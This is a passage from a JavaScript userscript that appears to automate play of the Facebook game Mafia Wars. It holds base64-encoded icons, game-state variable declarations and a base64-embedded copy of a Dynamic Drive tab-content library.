    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRFAH8OAX8PA4ARI5EvJJEvI5EwJJEwOJtDQqBMU6ldVKld/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS0UhugAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABJSURBVBhXY2AAASYgADPAgJUbCJgRXB4eHm42rFwWFhYOkCwHkAE0hRvIhgJuJtK4jOzs7FwgoziBDEaIM3DbC3MkK8LR' +
    'cC8AAM5rBHBrmgyTAAAAAElFTkSuQmCC' +
    '" />';

var healOnHoldIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRF/2oA/2oB/2wD/n8j/n8k/os4/pFC/ZtU/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnMpvDgAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABGSURBVBhXlY/BCgAgCEOrZer//3Czggjq0DttDOZMKShkiEE1gm3d3erVAmiRNgq2GPXCyp/NIqJRpRR5znjfZYpz5H6h' +
    'A1vyA1TohQLlAAAAAElFTkSuQmCC' +
    '" />';

var healOffIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRF/wAA/wEB/wMD/iQj/iQk/jg4/kNC/VRU/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeLKJyQAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABGSURBVBhXlY/BCgAgCEOrZer//3Czggjq0DttDOZMKShkiEE1gm3d3erVAmiRNgq2GPXCyp/NIqJRpRR5znjfZYpz5H6h' +
    'A1vyA1TohQLlAAAAAElFTkSuQmCC' +
    '" />';

var warningIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACgUlEQVR42pWST0gUURzHv29n/7S7rpuhlroW/kFdobQ8qBgdxItWB6NDkVAdukREWdShEr3YHyiicwQlJRJJEP2hOoVmapq1qbEuaWq7Cu6s6+7O' +
    'jLuz7zU7I1aYZXP5vWHm++Hzvu8R/OURJ15YGZWZJXePsNo/ZLUPYc9jS0ykQ0yWKKen2+1bG8T/AoS+tLf4J4UmeVFEaqaueX3Z8ZY1AxZGbm+e9y2OJttDFqoAeB+N2NMNRWm7mqbXBOAHb7YHJkMHHPnzYDEJ' +
    'YwNMsdA/yKi7deifgOCnqzu9I+E3jnyeuH0S5KiEApsE9wBYdpGlKrO+rWdVwMLHZl2El/pEPliWlRfAjYdALCbiTG0QnveA2Wbqs9qNFVkHn7A/Avjes0fH+4N3nBVz0FEB1zoAWQGcqwtCDkvoeUZQXLnh8JZj' +
    'b++tAPi7T9v8EwG3ycRvSncEwaR5NN8NKR2EcGmvABbX4duoEYJg86bnpBXmnugP/waYfXnkytd+//mSqilQYQosGsHlTgPMBuBkjWIcJ6CyDl3PzXCWp7XmN7ouLANmnzbkTrrmhrMcnnW2pO8AUwKUoMtDYOKA' +
    'sgxOMSCqBT/DYdxtlnJKHMV5p96Nq4CJttrO6aGx+m2VXk0nUREjGJll6rooRa8aJABMJhjoNsJRkPrIefHzfuLt2F3teuV5XVrpJWYrU7NY6rixnVPn9X3QwgokARLDBIO9RuYsz64mrtaSD8Kct7Rwx6KyHy3J' +
    'mFZNnFDVRBfVa2GasNBg7mEOJmvyIBlqyuOn3ZGUFVeK/TqJOjU7srRFICPTwBPf/ZokvSV5I8D9PJPlMFH7VN/p0poSDRKniIYCMz8A9QcpP1oZxJMAAAAASUVORK5CYIIK' +
    '" />';

var chickenIcon = '<img src="data:image/gif;base64,' +
    'R0lGODdhEAAQAMYAAAQCBKSKBHQCBEQ2FNTKDEwCBDQyTCQaBIyKvHxiDMzOzExOTBwaNCQCBFw+BPTmBHx6fPS+BDQmBExKfLy+BCQmJKSm3Hx+BAwOHMyaBKQCBExKHDwmDDQyZBwaHPTy9FxaXPz+BKSWBDQy' +
    'PPzKBGQCBJyavIRuDExOZCQmNCQWFGROBPzyBMQCBDw+ZBweHAwKDLSKBEwyBFQCBHxmBNze3FRSVDQCBGQ+DPzmBHx+fFxajLy+vJxyBBQSFLQCBBwaJPz+/PzWBJyazCwqRDw+dAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAHi4AAgoMAL4SHiDclM4iNGi0FjYcwLT+SkyUCMJeDJhUNE4Obgh6EFiguRRg6hoQeNUEQPgg7qzwKhzpBuhUGGx48t4QwNrsf' +
    'CyI5AwoKpYQ+IDogEiE5MT6XEgEPIUIRGT0Ho4QEFxQsJD0OOByNEisJJwkyHtiIIxYmLhISHkQdHeyJYkCwYMFBgQAAOw==' +
    '" />';

var hideIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/AP////8zM/f39+3t7YCAgOXl5fX19fT09BkZGdPT0xUVFbS0tMvLy4eHh/9LS/v7++Hh4aAVEtvb2/j4+M9NTKQWFMcuLDw8PMMcGkpKSrq6uqQVFKkXFawYFsYcGqAUEqcmI5GRkf7+/qen' +
    'p6+vr/Pz87u7uwMDA/9ra/5ycmNjY2lpaf5HR8gdGs3Nzf+Hh8AbGtLS0vr6+psUEdjY2NnZ2dJOTP/b26MWE+fn56cWFL0bGKsXFa4YFp0UEgAAACH5BAEAAD8ALAAAAAAQABAAAAaYwJ9wSCwaA8ikkRhoeTyY' +
    'wFKoQNkoFpiUqFCNCoJwgbCTIhDCDOAhAAAMgwQhREgwSD+FyO2G1wYCEwYQDEIPfAIDEoAAMm8JQhp8BTk0A3wAAgVCDm4CBAQml3wHmz8BNwApAT08BAUHsS4EQw0ADQEdOjgRLGdFFwAxATwVID5bRSclAA4c' +
    'Gx8zyUULAC9JSFMrAAtTQkEAOw==' +
    '" />';

var bgTabImage =  '<img src="http://playerscripts.com/images/mwap_graphics/generaltabimage.png" />';

var checkedIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOYAAAAAAP///1pdWVlcWF5hXV1gXFteWi0xKz5CPCcpJmNnYVPwAFLuAFHsAFHqAFDoAE/mAE/kAE7iAEvYAEnUAEXIAETGAETEAEPCAELAAEG8AD+2AD60AD2yAD2wADusADuqADiiADOUAC+I' +
    'AC6EACyAACt+ACt8AD6vAS6DAS6CASyAASp5AUW5CEODIkJ3JVKRMVGOMFOSMlKQMVSUM1GLMl6TQ1mJP2WYSlJ0PzM1MYODg4KCgoGBgX9/f35+fn19fXt7e3p6enl5eXh4eHZ2dnV1dXNzc3Jycl9fX11dXVtb' +
    'W1paWllZWVhYWFdXV1ZWVlNTU09PTzk5OTQ0NDAwMC0tLSgoKCQkJCIiIiEhIR8fHx0dHRsbG////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAF4ALAAAAAAQABAAAAergF6Cg4SFhoeIiYqLSY1KS09PUFFSLi+ESTs8PT4/QUJDNBUYhEs8nUBBQ0QyFgsQHINPP56rRjAYDAwbI4M5' +
    'OEJERUczuQ0cKYQtEzZHSDEZDg4cKjqDGBAMKDc1Gg4PHSoEVoMaFAsPFxUQDx4rBUpXhB4VDQ4QER4lBktMWIQIQmiAIOGDCQFNnDzJQmiKAhEeQJwYoHASF0JUqhwgwSIBFi1buHDpIigQADs=' +
    '" />';

var unCheckedIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOYAAAAAAP///4ODg4KCgoGBgX9/f35+fn19fXt7e3p6enl5eXh4eHZ2dnV1dXNzc3JycnFxcXBwcG5ubm1tbWxsbGtra2lpaWhoaGdnZ2VlZWRkZGNjY2JiYmFhYWBgYF9fX11dXVxcXFtbW1pa' +
    'WllZWVhYWFdXV1ZWVlNTU1BQUE9PT05OTkpKSkhISEVFRUREREFBQT4+Pjo6Ojk5OTU1NTQ0NDMzMzAwMC0tLSoqKigoKCcnJyQkJCIiIiEhIR8fHx0dHRsbG////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEIALAAAAAAQABAAAAeUgEKCg4SFhoeIiYqLH40gIiYmJygqKyyEHwIDBAUGCAkKDA4uhCIDnQcICgsNDxEwhCYGnqutEBIUMoQnnwui' +
    'txQVFzSEKaEOrhMUFhgZNoQrrRG4FhcZHB44hC3A1dcdHyA6hC8TFcwaGx6PIzyEMd7YICEkJSY9hDPXHh8hIvaTgBCqcQNHDh07ePj4AQRIEEGBAAA7' +
    '" />';

const noDelay = 0;              // No delay on commands
const minDelay = 1000;          // Minimum delay on commands
var running;                    // Is the autoplayer running?
var innerPageElt;               // The currently visible inner page
var appLayoutElt;               // The currently visible content page
var mastheadElt;                // Masthead content
var statsrowElt;                // statsrow content
var menubarElt;                 // menubar content
var popupfodderElt;             // popupfodder Element
var cash;                       // Cash array of values by city
var healthElt, health;          // Health DOM element and value
var maxHealthElt, maxHealth;    // Maximum health DOM element and value
var energyElt, energy;          // Energy DOM element and value
var maxEnergyElt, maxEnergy;    // Maximum energy DOM element and value
var staminaElt, stamina;        // Stamina DOM element and value
var maxStaminaElt, maxStamina;  // Maximum stamina DOM element and value
var levelElt, level;            // Level DOM element and value
var curAttack;                  // Current Attack stat value
var curDefense;                 // Current Defense stat value
var curAttackEquip;             // Current Attack equip value
var curDefenseEquip;            // Current Defense equip value
var prevAttackEquip;
var prevDefenseEquip;
var curExpElt, curExp;          // Experience DOM element and value
var lvlExpElt, lvlExp;          // Level up experience DOM element and value
var energyPackElt, energyPack;  // Is an energy pack waiting?
var ptsToNextLevel;             // Experience to next level up
var mafia;                      // Mafia size
var invites;                    // Number of mafia invitations
var stats;                      // Skill points
var city;                       // Current city (0=New York, 1=Cuba, 2=Moscow)
var skipStaminaSpend = false;   // Skip stamina actions for now?
var clickAction;                // Action being attempted with click simulation
var clickContext;               // Context for clickAction
var modificationTimer;          // Timer used to wait for content changes
var ajaxResultTimer;            // Timer for ajaxResultElt
var helpWar = false;            // Helping a friend's war?
var idle = true;                // Is the script currently idle?
var lastOpponent;               // Last opponent fought (object)
var suspendBank = false;        // Suspend banking for a while
var skipJobs = false;           // Skip doing jobs for a while
var jobOptimizeOn = false;      // Is job optimizing flag
var newStaminaMode;             // New stamina mode for random fighting
var checkOnWar;

//new_header = false ; // change the commented out line to disable all changes
new_header = xpathFirst('//div[@class="header_top_row"]') ? true : false; // checks for new header

if (!initialized && !checkInPublishPopup() && !checkLoadIframe() &&
    (/inthemafia/.test(document.referrer) ||
     /facebook\.mafiawars\.com/.test(window.location.href))) {
  var tabURI =
    "Ly8qKiBUYWIgQ29udGVudCBzY3JpcHQgdjIuMC0gqSBEeW5hbWljIERyaXZlIERIVE1MIGNvZGUgbGlicmFyeSAoaHR0cDovL3d3dy5keW5hbWljZHJpdmUuY29tKQ0KLy8qKiBVcGRhdGVkIE9jdCA3dGgsIDA3" +
    "IHRvIHZlcnNpb24gMi4wLiBDb250YWlucyBudW1lcm91cyBpbXByb3ZlbWVudHM6DQovLyAgIC1BZGRlZCBBdXRvIE1vZGU6IFNjcmlwdCBhdXRvIHJvdGF0ZXMgdGhlIHRhYnMgYmFzZWQgb24gYW4gaW50ZXJ2" +
    "YWwsIHVudGlsIGEgdGFiIGlzIGV4cGxpY2l0bHkgc2VsZWN0ZWQNCi8vICAgLUFiaWxpdHkgdG8gZXhwYW5kL2NvbnRyYWN0IGFyYml0cmFyeSBESVZzIG9uIHRoZSBwYWdlIGFzIHRoZSB0YWJiZWQgY29udGVu" +
    "dCBpcyBleHBhbmRlZC8gY29udHJhY3RlZA0KLy8gICAtQWJpbGl0eSB0byBkeW5hbWljYWxseSBzZWxlY3QgYSB0YWIgZWl0aGVyIGJhc2VkIG9uIGl0cyBwb3NpdGlvbiB3aXRoaW4gaXRzIHBlZXJzLCBvciBp" +
    "dHMgSUQgYXR0cmlidXRlIChnaXZlIHRoZSB0YXJnZXQgdGFiIG9uZSAxc3QpDQovLyAgIC1BYmlsaXR5IHRvIHNldCB3aGVyZSB0aGUgQ1NTIGNsYXNzbmFtZSAic2VsZWN0ZWQiIGdldCBhc3NpZ25lZC0gZWl0" +
    "aGVyIHRvIHRoZSB0YXJnZXQgdGFiJ3MgbGluayAoIkEiKSwgb3IgaXRzIHBhcmVudCBjb250YWluZXINCi8vKiogVXBkYXRlZCBGZWIgMTh0aCwgMDggdG8gdmVyc2lvbiAyLjE6IEFkZHMgYSAidGFiaW5zdGFu" +
    "Y2UuY3ljbGVpdChkaXIpIiBtZXRob2QgdG8gY3ljbGUgZm9yd2FyZCBvciBiYWNrd2FyZCBiZXR3ZWVuIHRhYnMgZHluYW1pY2FsbHkNCi8vKiogVXBkYXRlZCBBcHJpbCA4dGgsIDA4IHRvIHZlcnNpb24gMi4y" +
    "OiBBZGRzIHN1cHBvcnQgZm9yIGV4cGFuZGluZyBhIHRhYiB1c2luZyBhIFVSTCBwYXJhbWV0ZXIgKGllOiBodHRwOi8vbXlzaXRlLmNvbS90YWJjb250ZW50Lmh0bT90YWJpbnRlcmZhY2VpZD0wKSANCg0KLy8v" +
    "L05PIE5FRUQgVE8gRURJVCBCRUxPVy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQpmdW5jdGlvbiBkZHRhYmNvbnRlbnQodGFiaW50ZXJmYWNlaWQpew0KCXRoaXMudGFiaW50ZXJmYWNlaWQ9dGFiaW50ZXJm" +
    "YWNlaWQgLy9JRCBvZiBUYWIgTWVudSBtYWluIGNvbnRhaW5lcg0KCXRoaXMudGFicz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCh0YWJpbnRlcmZhY2VpZCkuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImEiKSAvL0dl" +
    "dCBhbGwgdGFiIGxpbmtzIHdpdGhpbiBjb250YWluZXINCgl0aGlzLmVuYWJsZXRhYnBlcnNpc3RlbmNlPXRydWUNCgl0aGlzLmhvdHRhYnNwb3NpdGlvbnM9W10gLy9BcnJheSB0byBzdG9yZSBwb3NpdGlvbiBv" +
    "ZiB0YWJzIHRoYXQgaGF2ZSBhICJyZWwiIGF0dHIgZGVmaW5lZCwgcmVsYXRpdmUgdG8gYWxsIHRhYiBsaW5rcywgd2l0aGluIGNvbnRhaW5lcg0KCXRoaXMuY3VycmVudFRhYkluZGV4PTAgLy9JbmRleCBvZiBj" +
    "dXJyZW50bHkgc2VsZWN0ZWQgaG90IHRhYiAodGFiIHdpdGggc3ViIGNvbnRlbnQpIHdpdGhpbiBob3R0YWJzcG9zaXRpb25zW10gYXJyYXkNCgl0aGlzLnN1YmNvbnRlbnRpZHM9W10gLy9BcnJheSB0byBzdG9y" +
    "ZSBpZHMgb2YgdGhlIHN1YiBjb250ZW50cyAoInJlbCIgYXR0ciB2YWx1ZXMpDQoJdGhpcy5yZXZjb250ZW50aWRzPVtdIC8vQXJyYXkgdG8gc3RvcmUgaWRzIG9mIGFyYml0cmFyeSBjb250ZW50cyB0byBleHBh" +
    "bmQvY29udGFjdCBhcyB3ZWxsICgicmV2IiBhdHRyIHZhbHVlcykNCgl0aGlzLnNlbGVjdGVkQ2xhc3NUYXJnZXQ9ImxpbmsiIC8va2V5d29yZCB0byBpbmRpY2F0ZSB3aGljaCB0YXJnZXQgZWxlbWVudCB0byBh" +
    "c3NpZ24gInNlbGVjdGVkIiBDU1MgY2xhc3MgKCJsaW5rcGFyZW50IiBvciAibGluayIpDQp9DQoNCmRkdGFiY29udGVudC5nZXRDb29raWU9ZnVuY3Rpb24oTmFtZSl7IA0KCXZhciByZT1uZXcgUmVnRXhwKE5h" +
    "bWUrIj1bXjtdKyIsICJpIik7IC8vY29uc3RydWN0IFJFIHRvIHNlYXJjaCBmb3IgdGFyZ2V0IG5hbWUvdmFsdWUgcGFpcg0KCWlmIChkb2N1bWVudC5jb29raWUubWF0Y2gocmUpKSAvL2lmIGNvb2tpZSBmb3Vu" +
    "ZA0KCQlyZXR1cm4gZG9jdW1lbnQuY29va2llLm1hdGNoKHJlKVswXS5zcGxpdCgiPSIpWzFdIC8vcmV0dXJuIGl0cyB2YWx1ZQ0KCXJldHVybiAiIg0KfQ0KDQpkZHRhYmNvbnRlbnQuc2V0Q29va2llPWZ1bmN0" +
    "aW9uKG5hbWUsIHZhbHVlKXsNCglkb2N1bWVudC5jb29raWUgPSBuYW1lKyI9Iit2YWx1ZSsiO3BhdGg9LyIgLy9jb29raWUgdmFsdWUgaXMgZG9tYWluIHdpZGUgKHBhdGg9LykNCn0NCg0KZGR0YWJjb250ZW50" +
    "LnByb3RvdHlwZT17DQoNCglleHBhbmRpdDpmdW5jdGlvbih0YWJpZF9vcl9wb3NpdGlvbil7IC8vUFVCTElDIGZ1bmN0aW9uIHRvIHNlbGVjdCBhIHRhYiBlaXRoZXIgYnkgaXRzIElEIG9yIHBvc2l0aW9uKGlu" +
    "dCkgd2l0aGluIGl0cyBwZWVycw0KCQl0aGlzLmNhbmNlbGF1dG9ydW4oKSAvL3N0b3AgYXV0byBjeWNsaW5nIG9mIHRhYnMgKGlmIHJ1bm5pbmcpDQoJCXZhciB0YWJyZWY9IiINCgkJdHJ5ew0KCQkJaWYgKHR5" +
    "cGVvZiB0YWJpZF9vcl9wb3NpdGlvbj09InN0cmluZyIgJiYgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQodGFiaWRfb3JfcG9zaXRpb24pLmdldEF0dHJpYnV0ZSgicmVsIikpIC8vaWYgc3BlY2lmaWVkIHRhYiBj" +
    "b250YWlucyAicmVsIiBhdHRyDQoJCQkJdGFicmVmPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHRhYmlkX29yX3Bvc2l0aW9uKQ0KCQkJZWxzZSBpZiAocGFyc2VJbnQodGFiaWRfb3JfcG9zaXRpb24pIT1OYU4g" +
    "JiYgdGhpcy50YWJzW3RhYmlkX29yX3Bvc2l0aW9uXS5nZXRBdHRyaWJ1dGUoInJlbCIpKSAvL2lmIHNwZWNpZmllZCB0YWIgY29udGFpbnMgInJlbCIgYXR0cg0KCQkJCXRhYnJlZj10aGlzLnRhYnNbdGFiaWRf" +
    "b3JfcG9zaXRpb25dDQoJCX0NCgkJY2F0Y2goZXJyKXthbGVydCgiSW52YWxpZCBUYWIgSUQgb3IgcG9zaXRpb24gZW50ZXJlZCEiKX0NCgkJaWYgKHRhYnJlZiE9IiIpIC8vaWYgYSB2YWxpZCB0YWIgaXMgZm91" +
    "bmQgYmFzZWQgb24gZnVuY3Rpb24gcGFyYW1ldGVyDQoJCQl0aGlzLmV4cGFuZHRhYih0YWJyZWYpIC8vZXhwYW5kIHRoaXMgdGFiDQoJfSwNCg0KCWN5Y2xlaXQ6ZnVuY3Rpb24oZGlyLCBhdXRvcnVuKXsgLy9Q" +
    "VUJMSUMgZnVuY3Rpb24gdG8gbW92ZSBmb3dhcmQgb3IgYmFja3dhcmRzIHRocm91Z2ggZWFjaCBob3QgdGFiICh0YWJpbnN0YW5jZS5jeWNsZWl0KCdmb3dhcmQvYmFjaycpICkNCgkJaWYgKGRpcj09Im5leHQi" +
    "KXsNCgkJCXZhciBjdXJyZW50VGFiSW5kZXg9KHRoaXMuY3VycmVudFRhYkluZGV4PHRoaXMuaG90dGFic3Bvc2l0aW9ucy5sZW5ndGgtMSk/IHRoaXMuY3VycmVudFRhYkluZGV4KzEgOiAwDQoJCX0NCgkJZWxz" +
    "ZSBpZiAoZGlyPT0icHJldiIpew0KCQkJdmFyIGN1cnJlbnRUYWJJbmRleD0odGhpcy5jdXJyZW50VGFiSW5kZXg+MCk/IHRoaXMuY3VycmVudFRhYkluZGV4LTEgOiB0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVu" +
    "Z3RoLTENCgkJfQ0KCQlpZiAodHlwZW9mIGF1dG9ydW49PSJ1bmRlZmluZWQiKSAvL2lmIGN5Y2xlaXQoKSBpcyBiZWluZyBjYWxsZWQgYnkgdXNlciwgdmVyc3VzIGF1dG9ydW4oKSBmdW5jdGlvbg0KCQkJdGhp" +
    "cy5jYW5jZWxhdXRvcnVuKCkgLy9zdG9wIGF1dG8gY3ljbGluZyBvZiB0YWJzIChpZiBydW5uaW5nKQ0KCQl0aGlzLmV4cGFuZHRhYih0aGlzLnRhYnNbdGhpcy5ob3R0YWJzcG9zaXRpb25zW2N1cnJlbnRUYWJJ" +
    "bmRleF1dKQ0KCX0sDQoNCglzZXRwZXJzaXN0OmZ1bmN0aW9uKGJvb2wpeyAvL1BVQkxJQyBmdW5jdGlvbiB0byB0b2dnbGUgcGVyc2lzdGVuY2UgZmVhdHVyZQ0KCQkJdGhpcy5lbmFibGV0YWJwZXJzaXN0ZW5j" +
    "ZT1ib29sDQoJfSwNCg0KCXNldHNlbGVjdGVkQ2xhc3NUYXJnZXQ6ZnVuY3Rpb24ob2Jqc3RyKXsgLy9QVUJMSUMgZnVuY3Rpb24gdG8gc2V0IHdoaWNoIHRhcmdldCBlbGVtZW50IHRvIGFzc2lnbiAic2VsZWN0" +
    "ZWQiIENTUyBjbGFzcyAoImxpbmtwYXJlbnQiIG9yICJsaW5rIikNCgkJdGhpcy5zZWxlY3RlZENsYXNzVGFyZ2V0PW9ianN0ciB8fCAibGluayINCgl9LA0KDQoJZ2V0c2VsZWN0ZWRDbGFzc1RhcmdldDpmdW5j" +
    "dGlvbih0YWJyZWYpeyAvL1JldHVybnMgdGFyZ2V0IGVsZW1lbnQgdG8gYXNzaWduICJzZWxlY3RlZCIgQ1NTIGNsYXNzIHRvDQoJCXJldHVybiAodGhpcy5zZWxlY3RlZENsYXNzVGFyZ2V0PT0oImxpbmtwYXJl" +
    "bnQiLnRvTG93ZXJDYXNlKCkpKT8gdGFicmVmLnBhcmVudE5vZGUgOiB0YWJyZWYNCgl9LA0KDQoJdXJscGFyYW1zZWxlY3Q6ZnVuY3Rpb24odGFiaW50ZXJmYWNlaWQpew0KCQl2YXIgcmVzdWx0PXdpbmRvdy5s" +
    "b2NhdGlvbi5zZWFyY2gubWF0Y2gobmV3IFJlZ0V4cCh0YWJpbnRlcmZhY2VpZCsiPShcXGQrKSIsICJpIikpIC8vY2hlY2sgZm9yICI/dGFiaW50ZXJmYWNlaWQ9MiIgaW4gVVJMDQoJCXJldHVybiAocmVzdWx0" +
